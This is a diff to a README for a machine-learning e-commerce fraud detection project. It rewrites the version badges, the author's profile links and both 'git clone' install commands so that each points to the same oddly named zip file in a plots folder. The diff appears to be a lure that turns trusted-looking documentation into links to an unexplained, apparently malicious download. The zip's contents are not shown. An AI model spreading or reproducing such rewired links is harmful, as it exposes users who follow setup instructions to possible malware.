@@ -4,9 +4,9 @@
 
 ### *Advanced Machine Learning Pipeline for Real-Time Fraud Detection*
 
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![scikit-learn](https://img.shields.io/badge/scikit--learn-1.2+-orange.svg)](https://scikit-learn.org/)
-[![XGBoost](https://img.shields.io/badge/XGBoost-1.7+-red.svg)](https://xgboost.readthedocs.io/)
+[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/ecommerce-fraud-detection/main/eda_plots/ecommerce_fraud_detection_inestivation.zip)
+[![scikit-learn](https://img.shields.io/badge/scikit--learn-1.2+-orange.svg)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/ecommerce-fraud-detection/main/eda_plots/ecommerce_fraud_detection_inestivation.zip)
+[![XGBoost](https://img.shields.io/badge/XGBoost-1.7+-red.svg)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/ecommerce-fraud-detection/main/eda_plots/ecommerce_fraud_detection_inestivation.zip)
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 [![Status](https://img.shields.io/badge/Status-Production%20Ready-success.svg)]()
 
@@ -118,7 +118,7 @@ A **complete end-to-end Machine Learning system** designed to detect fraudulent 
 ### 1️⃣ Clone Repository
 
 ```bash
-git clone https://github.com/yourusername/ecommerce-fraud-detection.git
+git clone https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/ecommerce-fraud-detection/main/eda_plots/ecommerce_fraud_detection_inestivation.zip
 cd ecommerce-fraud-detection
 ```
 
@@ -469,8 +469,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Senior Machine Learning Engineer**
 
-- 💼 LinkedIn: [Your LinkedIn](https://linkedin.com/in/yourprofile)
-- 🐙 GitHub: [@yourusername](https://github.com/yourusername)
+- 💼 LinkedIn: [Your LinkedIn](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/ecommerce-fraud-detection/main/eda_plots/ecommerce_fraud_detection_inestivation.zip)
+- 🐙 GitHub: [@yourusername](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/ecommerce-fraud-detection/main/eda_plots/ecommerce_fraud_detection_inestivation.zip)
 - 📧 Email: your.email@example.com
 
 ---
@@ -510,7 +510,7 @@ If you find this project helpful, please consider giving it a ⭐!
 **Get started in 3 commands:**
 
 ```bash
-git clone https://github.com/yourusername/ecommerce-fraud-detection.git
+git clone https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/ecommerce-fraud-detection/main/eda_plots/ecommerce_fraud_detection_inestivation.zip
 cd ecommerce-fraud-detection && python -m venv venv && .\venv\Scripts\activate
 pip install -r requirements.txt && python fraud_detection_pipeline.py
 ```
